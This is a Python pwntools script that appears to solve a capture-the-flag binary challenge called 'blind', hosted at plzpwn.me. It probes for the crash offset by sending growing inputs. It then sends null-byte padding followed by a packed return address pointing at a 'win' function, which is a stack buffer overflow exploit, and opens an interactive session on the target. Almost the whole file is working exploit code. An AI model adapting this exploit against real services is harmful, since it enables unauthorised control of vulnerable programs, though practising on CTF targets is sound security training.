#!/usr/bin/python3

from binascii import unhexlify
from pwn import *

PROGRAM_NAME = "blind"
ENCODING = "ascii"
REMOTE = 1
OFFSET = 16


def io_beg():
	return 	remote('plzpwn.me', 2001)
	#remote('plzpwn.me', 2000)
	#process('./jump')
	
def io_rdy(x):
	return x.recvuntil("This is almost exactly the same as jump...".encode(ENCODING), timeout = 10).decode(ENCODING)

def segfault_wrap(tries = 1):
	firstrun = 1
	last = 0

	for i in range(tries):
		header = str(i+1)+". "
		buf = segfault_inc()
		print(header+"seg fault at "+str(buf))
		if(firstrun): 
			firstrun = 0
			last = buf
		elif(buf != last):
			# bad result
			print(header+"Bad result! Last: "+last)
			return buf
		
			
	return buf
		
		

def segfault_inc(lam_beg = lambda: io_beg(), lam_rdy = lambda x: io_rdy(x), max = 100, bad_magic = "ault", good_magic = "------"):
	soup = ""
	entry = 1
		
	while(entry <= max):
		soup = soup + chr(entry+OFFSET)
		
		io = lam_beg()
		lam_rdy(io)
		io.sendline(soup.encode(ENCODING))
		inbound = io.recvall(timeout=5).decode(ENCODING)
		print(inbound)
		
		# any remote
		if(inbound.find(bad_magic) != -1): # seg found
			return (entry)
		
		if(not(REMOTE)):
			if(io.poll() != 0):
				return entry
		
		entry = (entry + 1)
		
	return -1

def main():
	stage = 0
	fin = 0
	
	while(fin < 1):
		if(stage == 0):
			if(REMOTE):
				seg = 68
			else:
				seg = segfault_wrap()
				
			stage = stage + 1
		elif(stage == 1):
			seg = seg+4# +4 IN THE ASM
			print("New seg fault val: "+str(seg))
			io = io_beg()
			io_rdy(io)
			fill = b'\x00'*seg
			payload = p32(0x080484D6)  # win export
			
			print("Fill: "+str(fill))
			print("Payload: "+str(payload))

			io.send_raw(fill) 
			io.send_raw(payload) # win
			io.sendline() # fire!
			
			io.interactive()
			stage = stage + 1
		else:
			print("Weird flex, exiting")
			fin = 1

if __name__ == '__main__':
	main()
